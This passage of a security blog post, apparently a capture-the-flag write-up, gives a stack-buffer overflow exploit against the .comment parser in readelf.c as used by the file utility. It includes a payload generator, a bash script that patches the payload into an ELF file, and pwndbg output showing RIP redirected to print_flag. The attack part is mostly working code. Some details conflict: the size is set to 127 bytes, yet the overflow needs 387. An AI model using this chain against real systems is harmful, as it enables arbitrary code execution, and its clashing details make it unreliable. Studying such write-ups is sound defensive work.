</span></span><span style="display:flex;"><span>blob <span style="color:#f92672">+=</span> MANUAL_RIP
</span></span><span style="display:flex;"><span><span style="color:#75715e"># idx = 378..385 -&gt; comment[248..255] = &#34;\xf2\x41\x42\x00\x00\x00\x00\x00&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Finally, idx=386 -&gt; send “)” to break the loop (no write):</span>
</span></span><span style="display:flex;"><span>blob <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Loop ends; doshn will call ret, popping 0x004241f2 into RIP.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;payload.bin&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(blob)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;payload.bin is </span><span style="color:#e6db74">{</span>len(blob)<span style="color:#e6db74">}</span><span style="color:#e6db74"> bytes (should be 387).&#34;</span>)
</span></span></code></pre></div><ul>
<li><strong>First <code>&quot;(&quot;</code> at idx=0</strong> sets <code>version_start = 1</code>.</li>
<li><strong>128× <code>&quot;A&quot;</code> at idx=1..128</strong> fills <code>comment[0..127]</code>.</li>
<li><strong>Second <code>&quot;(&quot;</code> at idx=129</strong> sets <code>version_start = 130</code>.</li>
<li><strong>248× <code>&quot;B&quot;</code> at idx=130..377</strong>
<ul>
<li>idx=130..257 (128 bytes) refill <code>comment[0..127]</code>.</li>
<li>idx=258..377 (120 bytes) overflow into locals and saved-RBP up through offset 247.</li>
</ul>
</li>
<li><strong>8 bytes of <code>MANUAL_RIP</code> at idx=378..385</strong> overwrite saved-RIP (offset 248..255).</li>
<li><strong>Final <code>&quot;)&quot;</code> at idx=386</strong> breaks the loop, preventing any further writes.</li>
</ul>
<p>After that, <code>doshn</code> does a <code>ret</code>, and the CPU pops <code>0x004241f2</code> into <code>%rip</code>, redirecting execution.</p>
<hr>
<h2 id="4-patching-a-minimal-elf-patchsh">4. Patching a Minimal ELF (<code>patch.sh</code>)<a hidden class="anchor" aria-hidden="true" href="#4-patching-a-minimal-elf-patchsh">#</a></h2>
<p>We start from a trivial C program:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Compile it (e.g., <code>gcc -no-pie -o exploit.elf exploit.c</code>) to produce a minimal ELF named <code>exploit.elf</code>. That ELF automatically has a <code>.comment</code> section (filled with compiler version strings). We will remove that section and replace it with our <code>payload.bin</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># patch.sh</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1) Removes any existing .comment section from exploit.elf.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2) Injects payload.bin as a new .comment section (with ALLOC flag).</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3) Patches .comment’s sh_size field to be 0x7f (127).</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Usage:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#   1) Generate payload.bin as shown above.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#   2) Update FILE, PAYLOAD, E_SHOFF_HEX, COMMENT_SEC_IDX below.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#   3) chmod +x patch_and_inject.sh &amp;&amp; ./patch_and_inject.sh</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#   4) Verify with `readelf -S exploit.elf | grep .comment`</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##### -- USER‐EDITABLE SECTION ----------------------------------------------------</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>FILE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;exploit.elf&#34;</span>         <span style="color:#75715e"># The ELF to patch</span>
</span></span><span style="display:flex;"><span>PAYLOAD<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;payload.bin&#34;</span>      <span style="color:#75715e"># The malicious payload</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># From `readelf -h exploit.elf`:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#   Start of section headers: 0x&lt;hex&gt;</span>
</span></span><span style="display:flex;"><span>E_SHOFF_HEX<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0x4768&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># From `readelf -S exploit.elf | grep &#34;\.comment&#34;` (before patch):</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#   [ 25] .comment …</span>
</span></span><span style="display:flex;"><span>COMMENT_SEC_IDX<span style="color:#f92672">=</span><span style="color:#ae81ff">25</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##### -- END OF USER‐EDITABLE SECTION --------------------------------------------</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1) Remove any existing .comment</span>
</span></span><span style="display:flex;"><span>objcopy --remove-section .comment <span style="color:#e6db74">&#34;</span>$FILE<span style="color:#e6db74">&#34;</span> 2&gt;/dev/null <span style="color:#f92672">||</span> true
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2) Add payload.bin as .comment (with ALLOC so readelf will load it)</span>
</span></span><span style="display:flex;"><span>objcopy   --add-section .comment<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$PAYLOAD<span style="color:#e6db74">&#34;</span>   --set-section-flags .comment<span style="color:#f92672">=</span>contents,alloc   <span style="color:#e6db74">&#34;</span>$FILE<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">||</span> <span style="color:#f92672">{</span> echo <span style="color:#e6db74">&#34;Injection failed&#34;</span>; exit 1; <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;Before patch:&#34;</span>
</span></span><span style="display:flex;"><span>readelf -S <span style="color:#e6db74">&#34;</span>$FILE<span style="color:#e6db74">&#34;</span> | grep <span style="color:#e6db74">&#39;\.comment&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3) Compute where to patch sh_size for .comment to 0x7f</span>
</span></span><span style="display:flex;"><span>E_SHOFF<span style="color:#f92672">=</span><span style="color:#66d9ef">$((</span>E_SHOFF_HEX<span style="color:#66d9ef">))</span>
</span></span><span style="display:flex;"><span>BYTES_PER_SHDR<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span>
</span></span><span style="display:flex;"><span>SH_SIZE_OFFSET<span style="color:#f92672">=</span><span style="color:#ae81ff">32</span>  <span style="color:#75715e"># within each Elf64_Shdr</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SH_SIZE_FIELD_OFFSET<span style="color:#f92672">=</span><span style="color:#66d9ef">$((</span> E_SHOFF <span style="color:#f92672">+</span> COMMENT_SEC_IDX*BYTES_PER_SHDR <span style="color:#f92672">+</span> SH_SIZE_OFFSET <span style="color:#66d9ef">))</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>printf <span style="color:#e6db74">&#39;\x7f\x00\x00\x00\x00\x00\x00\x00&#39;</span> |   dd of<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$FILE<span style="color:#e6db74">&#34;</span> bs<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> seek<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$SH_SIZE_FIELD_OFFSET<span style="color:#e6db74">&#34;</span> count<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span> conv<span style="color:#f92672">=</span>notrunc status<span style="color:#f92672">=</span>none
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;After patch:&#34;</span>
</span></span><span style="display:flex;"><span>readelf -S <span style="color:#e6db74">&#34;</span>$FILE<span style="color:#e6db74">&#34;</span> | grep <span style="color:#e6db74">&#39;\.comment&#39;</span>
</span></span></code></pre></div><ul>
<li><strong>Step 1</strong>: <code>--remove-section .comment</code> deletes the existing <code>.comment</code>.</li>
<li><strong>Step 2</strong>: <code>--add-section .comment=payload.bin</code> creates a new <code>.comment</code> containing our 387 bytes. We set <code>contents,alloc</code> so that section is loaded.</li>
<li><strong>Step 3</strong>: We patch the <code>sh_size</code> field (8 bytes at offset <code>E_SHOFF + 64*COMMENT_SEC_IDX + 32</code>) to <code>0x7f</code> so that <code>readelf</code> will only read the first 127 bytes of <code>.comment</code> (enough to trigger the overflow).</li>
</ul>
<p>After running this script, <code>exploit.elf</code> has a <code>.comment</code> of size 0x7f whose contents begin with our 387-byte payload. When <code>doshn</code> reads up to 127 bytes of that section, it will see both <code>(</code> characters, overflow into saved-RIP, and then return into our chosen address.</p>
<hr>
<h2 id="5-verifying-the-exploit-under-pwndbg">5. Verifying the Exploit under pwndbg<a hidden class="anchor" aria-hidden="true" href="#5-verifying-the-exploit-under-pwndbg">#</a></h2>
<ol>
<li><strong>Launch pwndbg on the patched binary</strong>:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg --args ./file -m magic.mgc exploit.elf
</span></span></code></pre></div>Inside GDB:
<pre tabindex="0"><code class="language-gdb" data-lang="gdb">pwndbg&gt; b readelf.c:1510    # break right before “comment[idx-version_start] = &#39;\0&#39;”
pwndbg&gt; run
</code></pre>You should see:
<pre tabindex="0"><code class="language-gdb" data-lang="gdb">Breakpoint 1, doshn (…) at readelf.c:1510
</code></pre></li>
</ol>
<hr>
<ol start="2">
<li>
<p><strong>Check local variables</strong>:</p>
<pre tabindex="0"><code class="language-gdb" data-lang="gdb">pwndbg&gt; info locals
c             = 41          # &#39;)&#39;
idx           = 386
version_start = 130
comment       = &#34;B&#34;*128
… 
</code></pre><ul>
<li><code>version_start = 130</code> confirms the <strong>second</strong> <code>(</code> arrived at <code>idx = 129</code>.</li>
<li><code>idx = 386</code> means we just processed the final <code>')'</code>.</li>
</ul>
</li>
<li>
<p><strong>Find <code>comment[0]</code> in memory</strong> (using <code>rdx</code>, which was set by <code>lea rdx, [rbp-0xf0]</code> earlier):</p>
<pre tabindex="0"><code class="language-gdb" data-lang="gdb">pwndbg&gt; print/x $rdx
$1 = 0x7fffffffd490    # example address of comment[0]
</code></pre></li>
<li>
<p><strong>Compute saved-RIP = <code>comment[0] + 0xf8</code></strong> (248 bytes past):</p>
<pre tabindex="0"><code class="language-gdb" data-lang="gdb">pwndbg&gt; print/x $rdx + 0xf8
$2 = 0x7fffffffd588    # address of saved-RIP
</code></pre></li>
<li>
<p><strong>Dump the 8 bytes at that address</strong>:</p>
<pre tabindex="0"><code class="language-gdb" data-lang="gdb">pwndbg&gt; x/gx $rdx + 0xf8
0x7fffffffd588: 0x00000000004241f2
</code></pre><p>Those eight bytes match our <code>MANUAL_RIP = b&quot;\xf2\x41\x42\x00\x00\x00\x00\x00&quot;</code>, so saved-RIP was overwritten correctly with <code>0x004241f2</code>.</p>
</li>
<li>
<p><strong>Execute the <code>ret</code> so it actually jumps</strong>:</p>
<pre tabindex="0"><code class="language-gdb" data-lang="gdb">pwndbg&gt; finish
</code></pre><p>GDB prints:</p>
<pre tabindex="0"><code class="language-gdb" data-lang="gdb">Run till exit from #0  doshn (…) at readelf.c:1510
0x00000000004241f2 in print_flag ()
</code></pre><p>That shows control has transferred to <code>print_flag</code> at <code>0x4241f2</code>. You have successfully hijacked RIP.</p>
</li>
</ol>
<hr>
<h2 id="6-summary">6. Summary<a hidden class="anchor" aria-hidden="true" href="#6-summary">#</a></h2>
<ul>
<li><strong>Vulnerability</strong>: Unbounded stack write in <code>doshn</code> when parsing <code>.comment</code>. Two carefully placed <code>(</code> characters cause writes to overflow from a 128-byte buffer into saved-RIP.</li>
<li><strong>Payload</strong>: 387 bytes that:
<ol>
<li>Perform two “(`)” markers at strategic indices to reset the write base,</li>
<li>Overflow exactly 248 bytes past the second <code>(</code> into saved-RIP,</li>
<li>Place an 8-byte target address (little-endian) at saved-RIP,</li>
<li>Break with <code>')'</code> so no further writes occur.</li>
</ol>
</li>
<li><strong>ELF Injection</strong>: We carve out a minimal ELF (<code>exploit.elf</code>), remove its original <code>.comment</code>, insert <code>payload.bin</code>, and patch <code>.comment.sh_size</code> to 0x7f.</li>
<li><strong>Verification</strong>: Under pwndbg, at the overwrite‐site breakpoint:
<ul>
<li>Check <code>version_start = 130</code> (second <code>(</code> at idx=129).</li>
<li>Read saved-RIP from <code>comment[0] + 248 = $rdx + 0xf8</code>.</li>
<li>Confirm the 8 bytes equal our chosen return address.</li>
<li>Use <code>finish</code> (or <code>stepi</code>) to execute the <code>ret</code> and land in <code>print_flag</code>.</li>
</ul>
</li>
</ul>
<p>This end-to-end chain demonstrates a reliable stack-buffer overflow in readelf’s <code>.comment</code> parser that grants arbitrary code execution by overwriting the return address.</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://vasilis-security-notes.vercel.app/tags/vulnerability-research/">Vulnerability Research</a></li>
      <li><a href="https://vasilis-security-notes.vercel.app/tags/buffer-overflow/">Buffer Overflow</a></li>
      <li><a href="https://vasilis-security-notes.vercel.app/tags/linux/">Linux</a></li>
      <li><a href="https://vasilis-security-notes.vercel.app/tags/binary-exploitation/">Binary Exploitation</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://vasilis-security-notes.vercel.app/">Vasilis&#39; Security Notes</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
